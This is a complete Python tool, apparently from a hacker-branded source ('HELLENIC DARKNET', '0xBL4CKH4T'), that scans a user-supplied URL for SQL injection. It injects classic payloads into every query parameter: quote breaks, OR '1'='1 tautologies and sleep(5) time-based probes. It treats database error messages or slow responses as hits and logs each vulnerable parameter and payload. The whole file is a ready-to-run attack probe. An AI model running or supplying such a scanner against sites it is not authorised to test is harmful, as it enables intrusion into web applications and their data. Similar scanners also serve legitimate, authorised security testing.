import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode
from rich.console import Console
from datetime import datetime

console = Console()

console.print("[bold red]\n[ HELLENIC DARKNET SQLi SCANNER ][/bold red]")
console.print("[green]Made by: 0xBL4CKH4T[/green]\n")

payloads = [
    "'",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'--",
    "' OR sleep(5)--",
    "\" OR sleep(5)--",
    "') OR ('1'='1",
]

errors = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "ODBC SQL",
    "ORA-01756",
    "syntax error",
]

def scan_sqli(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        console.print("[yellow]No parameters found in the URL.[/yellow]")
        return

    for param in params:
        for payload in payloads:
            mod_params = params.copy()
            mod_params[param] = payload
            new_query = urlencode(mod_params, doseq=True)
            full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            try:
                start = time.time()
                r = requests.get(full_url, timeout=10)
                delay = round(time.time() - start, 2)

                found_error = any(e.lower() in r.text.lower() for e in errors)
                is_time = delay >= 5 and "sleep" in payload

                if found_error or is_time:
                    console.print(f"[bold green][+] Possible SQLi in '{param}' with payload: {payload}[/bold green]")
                    with open("logs/sqli_vulns.txt", "a") as f:
                        f.write(f"[{datetime.now()}] {param} => {payload} @ {full_url} (delay: {delay}s)\n")

                else:
                    console.print(f"[blue][-] {param} not vulnerable with payload: {payload}[/blue]")

            except Exception as e:
                console.print(f"[yellow][!] Error: {e}[/yellow]")

def main():
    target = input("Enter target URL (with parameter): ").strip()
    scan_sqli(target)

if __name__ == "__main__":
    main()
